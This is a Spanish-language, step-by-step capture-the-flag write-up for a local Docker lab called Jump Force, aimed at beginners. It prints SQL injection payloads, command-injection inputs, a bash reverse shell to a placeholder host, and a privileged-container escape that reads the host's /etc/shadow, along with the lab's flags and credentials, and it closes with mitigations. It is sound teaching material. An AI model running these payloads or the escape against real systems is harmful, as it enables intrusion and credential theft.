# Solución completa — Jump Force CTF

> Este documento está pensado para alguien que nunca ha hecho un CTF. Se explica cada paso desde cero, qué herramienta usar, cómo interpretarla y por qué funciona cada ataque.

---

## Índice

1. [Levantar el entorno](#1-levantar-el-entorno)
2. [Reconocimiento externo](#2-reconocimiento-externo)
3. [Enumeración web](#3-enumeración-web)
4. [SQL Injection en password.php → Flag 1 y credenciales](#4-sql-injection-en-passwordphp--flag-1-y-credenciales)
5. [Command Injection en backup.php → RCE](#5-command-injection-en-backupphp--rce)
6. [Pivoting: SSH al contenedor dos → Flag 2](#6-pivoting-ssh-al-contenedor-dos--flag-2)
7. [Bonus: Escape de contenedor privilegiado](#7-bonus-escape-de-contenedor-privilegiado)
8. [Resumen de flags y credenciales](#8-resumen-de-flags-y-credenciales)

---

## 1. Levantar el entorno

### ¿Qué necesitas?

- Docker instalado (`docker --version` para verificar)
- Docker Compose instalado (`docker-compose --version` para verificar)
- El directorio `jump_force/` con sus dos subdirectorios `uno/` y `dos/`

### Arrancar los contenedores

Abre una terminal, navega hasta el directorio del reto y ejecuta:

```bash
cd jump_force/
docker-compose up --build
```

Verás cómo Docker descarga las imágenes y arranca los dos contenedores. Cuando la terminal muestre logs continuos (sin errores), el entorno está listo.

> Deja esta terminal abierta con los contenedores corriendo. Abre una segunda terminal para el resto de los pasos.

### Verificar que todo funciona

```bash
# Ver que los dos contenedores están corriendo
docker ps
```

Deberías ver dos contenedores: uno basado en `jump_force_one` y otro en `jump_force_two`.

### Obtener la IP del contenedor uno

```bash
docker inspect jump_force_uno_1 | grep IPAddress
```

O simplemente usa `localhost` y el puerto 5000, que es donde está mapeado.

Abre el navegador y ve a: `http://localhost:5000`

Si ves texto de Apache o una página PHP, el contenedor está funcionando.

---

## 2. Reconocimiento externo

### ¿Qué es el reconocimiento?

Es la fase en la que descubrimos qué servicios están activos y qué versiones usan, sin atacar todavía. Es el equivalente a "mirar el edificio desde fuera antes de entrar".

### Escaneo de puertos con nmap

```bash
nmap -sV -sC -p- localhost
```

**¿Qué significa cada flag?**

| Flag | Significado |
|---|---|
| `-sV` | Detecta la versión de cada servicio |
| `-sC` | Lanza scripts básicos de enumeración |
| `-p-` | Escanea todos los 65535 puertos (no solo los más comunes) |

**Resultado esperado:**

```
PORT     STATE SERVICE VERSION
5000/tcp open  http    Apache httpd 2.4.x (Debian)
```

Solo hay un servicio expuesto: el servidor web en el puerto 5000.

> **Concepto:** La superficie de ataque es mínima externamente. El contenedor `dos` (SSH) no está expuesto al host — solo es accesible desde la red interna de Docker. Esto es una segmentación de red, aunque en este caso el contenedor `uno` actúa de puente.

---

## 3. Enumeración web

### ¿Qué es la enumeración web?

Buscar páginas y directorios que no están enlazados desde la página principal. Muchas aplicaciones tienen páginas de administración, backup o debug accesibles si sabes dónde mirar.

### Fuerza bruta de directorios con gobuster

```bash
gobuster dir -u http://localhost:5000 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak
```

**¿Qué significa cada flag?**

| Flag | Significado |
|---|---|
| `-u` | URL objetivo |
| `-w` | Wordlist (lista de palabras a probar como rutas) |
| `-x` | Extensiones de fichero a probar además del nombre base |

**Resultado esperado:**

```
/index.php          (Status: 200)
/password.php       (Status: 200)
/backup.php         (Status: 200)
/index.html.bak     (Status: 200)
```

### Inspeccionar cada página

Visita cada URL en el navegador:

- **`/index.php`** — Página de bienvenida con pistas: "soy una vulnerabilidad? soy dos vulnerabilidades? soy tres..."
- **`/password.php`** — Formulario que acepta un ID numérico y devuelve frases de una base de datos
- **`/backup.php`** — Formulario que suma dos números usando el servidor
- **`/index.html.bak`** — Página por defecto de Apache (sin contenido útil, es una distracción)

> **Concepto (OWASP A05 — Security Misconfiguration):** El fichero `.bak` es accesible públicamente. Los ficheros de backup nunca deben estar en el directorio web. También los mensajes de `index.php` revelan que hay múltiples vulnerabilidades, lo que se conoce como "information disclosure".

---

## 4. SQL Injection en `password.php` → Flag 1 y credenciales

### ¿Qué es SQL Injection?

La aplicación construye una consulta a la base de datos usando datos que introduce el usuario, sin validarlos. Si el usuario escribe SQL en lugar de un número normal, puede alterar la lógica de la consulta y acceder a datos que no debería.

### Ver el código vulnerable

Puedes ver el código del servidor así (sin levantar el reto):

```bash
docker run --rm --entrypoint bash jserrai/tfm_ctf:jump_force_one -c "cat /var/www/html/password.php"
```

La línea vulnerable es:

```php
$query = mysqli_query($dbconnect, "select id,frase from frases where id = '$id';");
```

El valor de `$id` viene directamente del formulario sin ningún filtro. Si introduces `1' OR '1'='1`, la query resultante es:

```sql
select id,frase from frases where id = '1' OR '1'='1';
```

Que devuelve TODAS las filas porque `'1'='1'` es siempre verdadero.

### Paso 1 — Confirmar la inyección

Ve a `http://localhost:5000/password.php` e introduce en el campo ID:

```
1'
```

Si la aplicación devuelve un error SQL (o un resultado extraño), la inyección es posible.

### Paso 2 — Contar columnas con ORDER BY

Para usar UNION después, necesitamos saber cuántas columnas devuelve la query original. Lo hacemos con ORDER BY hasta que da error:

```
1' ORDER BY 1-- -
1' ORDER BY 2-- -
1' ORDER BY 3-- -
```

Cuando `ORDER BY 3` da error y `ORDER BY 2` funciona → la query devuelve **2 columnas**.

> El `-- -` es un comentario SQL que "mata" el resto de la query original para que no interfiera.

### Paso 3 — UNION para ver columnas reflejadas

```
1' UNION SELECT 1,2-- -
```

Si ves el número `2` en la página, esa columna se refleja en la respuesta. La usaremos para extraer datos.

### Paso 4 — Listar tablas de la base de datos

```
1' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='poc'-- -
```

`information_schema` es una base de datos especial de MySQL que contiene metadatos sobre todas las demás. La base de datos se llama `poc`.

**Tablas encontradas:** `frases`, `flags`, `users`

### Paso 5 — Ver columnas de cada tabla interesante

```
1' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'-- -
```

**Columnas de `users`:** `user`, `pass`

```
1' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='flags'-- -
```

**Columnas de `flags`:** `flag_number`, `flag_value`

### Paso 6 — Extraer la Flag 1 de la tabla `flags`

```
1' UNION SELECT flag_number,flag_value FROM flags-- -
```

**FLAG 1:** `003d873449f8e8ff13b72f2061bfbaa4e5a84b82`

### Paso 7 — Extraer credenciales de la tabla `users`

```
1' UNION SELECT user,pass FROM users-- -
```

**Credenciales obtenidas:**

| Usuario | Contraseña |
|---|---|
| pablo | `tefeme!.` |
| mark | `highway` |
| vanessa | `proof` |
| hancook | `rupert` |
| louis | `vAncouver.;` |
| Steve | `f1lem0n:D` |

> **Concepto:** Las contraseñas están almacenadas en **texto claro** en la base de datos. Esto es un error grave de seguridad. Las contraseñas deben almacenarse siempre como hashes con algoritmos como bcrypt o argon2, nunca en texto plano. Si un atacante accede a la BD, obtiene todas las contraseñas directamente sin necesidad de crackearlas.

---

## 5. Command Injection en `backup.php` → RCE

### ¿Qué es Command Injection?

La aplicación ejecuta un comando del sistema operativo usando datos del usuario, sin validarlos. El atacante puede "inyectar" comandos propios que el servidor ejecutará con sus privilegios.

### Ver el código vulnerable

```bash
docker run --rm --entrypoint bash jserrai/tfm_ctf:jump_force_one -c "cat /var/www/html/backup.php"
```

La línea vulnerable es:

```php
$execution = shell_exec('echo ' . $c1 . ' + ' . $c2 . ' | bc');
```

El servidor construye este comando de shell: `echo [c1] + [c2] | bc`

Si `c1 = 1; id`, el comando resultante es: `echo 1; id + 1 | bc`

El punto y coma (`;`) en bash separa comandos, así que el servidor ejecuta primero `echo 1` y luego `id` como comandos independientes.

### Verificar RCE

Ve a `http://localhost:5000/backup.php`:

1. Responde `Y` a la pregunta
2. **Numero 1:** `1; id`
3. **Numero 2:** `1`

Si la respuesta incluye algo como `uid=33(www-data)`, tienes ejecución remota de comandos (RCE) en el servidor.

### Explorar el sistema desde backup.php

Puedes ejecutar cualquier comando. Algunos útiles para la siguiente fase:

**Ver la IP de la red interna (para encontrar el contenedor dos):**
- Numero 1: `1; ip route`

**Comprobar si el contenedor dos está accesible:**
- Numero 1: `1; ping -c 1 dos`

> Docker Compose crea una red interna y registra cada servicio por su nombre en DNS. El contenedor `dos` es accesible como hostname `dos` desde el contenedor `uno`.

**Verificar el puerto SSH del contenedor dos:**
- Numero 1: `1; nc -zv dos 2222`

Si responde `open`, el puerto SSH está activo.

> **Concepto (OWASP A03, CWE-78):** `shell_exec()` no debe usarse nunca con entrada del usuario. Si es necesario ejecutar comandos del sistema, hay que usar funciones nativas del lenguaje o validar/escapar la entrada estrictamente.

---

## 6. Pivoting: SSH al contenedor dos → Flag 2

### ¿Qué es el pivoting?

El contenedor `dos` no tiene puertos expuestos al exterior (no hay entrada en `ports:` en el docker-compose). Desde tu máquina no puedes conectarte directamente. Pero desde el contenedor `uno` sí, porque están en la misma red interna de Docker.

Usar el contenedor `uno` como puente para llegar al `dos` se llama **pivoting**.

### Opción A — Desde una reverse shell en contenedor uno

Si tienes una shell interactiva en el contenedor `uno` (via reverse shell desde backup.php), puedes ejecutar directamente:

**En tu máquina, abre un listener:**

```bash
nc -lvnp 4444
```

**Desde backup.php, lanza la reverse shell:**
- Numero 1: `1; bash -i >& /dev/tcp/TU_IP/4444 0>&1`

Una vez con la shell en el contenedor `uno`:

```bash
ssh -o StrictHostKeyChecking=no pablo@dos -p 2222
# Password: tefeme!.
```

### Opción B — Desde backup.php directamente (sin reverse shell)

Si no necesitas shell interactiva, puedes encadenar comandos directamente en backup.php:

- Numero 1: `1; ssh -o StrictHostKeyChecking=no pablo@dos -p 2222 'cat /home/pablo/.flag.txt'`
- Numero 2: `1`
- Respuesta: `Y`

### Obtener Flag 2

Una vez conectado como pablo en el contenedor `dos`:

```bash
pablo@dos:~$ cat .flag.txt
```

**FLAG 2:** `4d8c72671245d9d1b8e03a826db9d5ecead28c8c`

> **Concepto — Segmentación de red:** El contenedor `dos` no está expuesto directamente al atacante, pero la segmentación falla porque el contenedor `uno` (comprometido) puede alcanzarlo. Una arquitectura correcta aislaría estos contenedores en redes Docker separadas con políticas de firewall entre ellas.

---

## 7. Bonus: Escape de contenedor privilegiado

### ¿Qué significa `privileged: true`?

El fichero `docker-compose.yml` tiene:

```yaml
dos:
    privileged: true
```

En Docker, los contenedores normales están aislados del host: no pueden acceder a los discos físicos, no pueden modificar el kernel, etc. Con `privileged: true`, el contenedor recibe **todas las capacidades de Linux** y acceso a todos los dispositivos del host. Es como darle las llaves del edificio entero cuando solo debería tener la llave de su piso.

### Demostración del escape (requiere ser root dentro del contenedor)

Si escalas privilegios hasta root dentro del contenedor `dos`, puedes hacer lo siguiente:

**1. Listar los discos del host:**

```bash
fdisk -l
# Resultado: /dev/sda, /dev/sda1, etc.
```

Desde dentro del contenedor puedes ver los discos físicos del host porque el contenedor es privilegiado.

**2. Montar el sistema de ficheros del host:**

```bash
mkdir /tmp/host
mount /dev/sda1 /tmp/host
```

**3. Acceder al host completo:**

```bash
ls /tmp/host/root/
ls /tmp/host/etc/
cat /tmp/host/etc/shadow   # hashes de contraseñas del HOST
```

O entrar directamente en el sistema del host:

```bash
chroot /tmp/host
whoami   # root (del host, no del contenedor)
```

> **Concepto (CWE-250 — Privilegios excesivos):** Una vez escapado, el atacante tiene acceso root al host real, puede leer `/etc/shadow`, modificar ficheros del sistema, acceder a otros contenedores, instalar backdoors, etc. La mitigación es eliminar `privileged: true` y usar `--cap-add` solo con las capacidades estrictamente necesarias para la aplicación.

### Nota sobre este reto

El contenedor `dos` de este CTF no tiene implementado un fichero de flag de root. La fase de escape es una **demostración conceptual** de la vulnerabilidad. En un entorno real de pentesting, el acceso al host es el objetivo final y la prueba es poder leer `/etc/shadow` o modificar ficheros críticos del sistema.

---

## 8. Resumen de flags y credenciales

### Flags

| # | Nombre | Dónde se encuentra | Cómo se obtiene | Valor |
|---|---|---|---|---|
| 1 | Web / BD | Tabla `flags` en MySQL, contenedor uno | SQL Injection UNION en `password.php` | `003d873449f8e8ff13b72f2061bfbaa4e5a84b82` |
| 2 | User | `/home/pablo/.flag.txt`, contenedor dos | SSH con credenciales obtenidas por SQL Injection | `4d8c72671245d9d1b8e03a826db9d5ecead28c8c` |

### Credenciales

| Servicio | Usuario | Contraseña | Cómo se obtiene |
|---|---|---|---|
| MySQL (contenedor uno) | `poc` | `1234` | Hardcodeada en `password.php` |
| SSH (contenedor dos, puerto 2222) | `pablo` | `tefeme!.` | SQL Injection en tabla `users` |

### Otras credenciales de la tabla `users`

| Usuario | Contraseña |
|---|---|
| mark | `highway` |
| vanessa | `proof` |
| hancook | `rupert` |
| louis | `vAncouver.;` |
| Steve | `f1lem0n:D` |

---

## Mitigaciones

| Vulnerabilidad | Mitigación |
|---|---|
| SQL Injection | Usar consultas parametrizadas con PDO (`$stmt = $pdo->prepare("SELECT ... WHERE id = ?")`) |
| Command Injection | Nunca pasar entrada del usuario a `shell_exec()`. Usar funciones nativas PHP para operaciones matemáticas |
| Contraseñas en texto claro | Hashear siempre con `password_hash()` (bcrypt) en PHP; nunca almacenar en claro |
| `privileged: true` | Eliminar el flag. Usar `--cap-add` solo con las capacidades necesarias |
| Red Docker plana | Separar contenedores en redes Docker distintas con políticas de acceso explícitas |
| Ficheros `.bak` expuestos | Nunca dejar ficheros de backup en el directorio web; añadir reglas en `.htaccess` o la config de Apache |
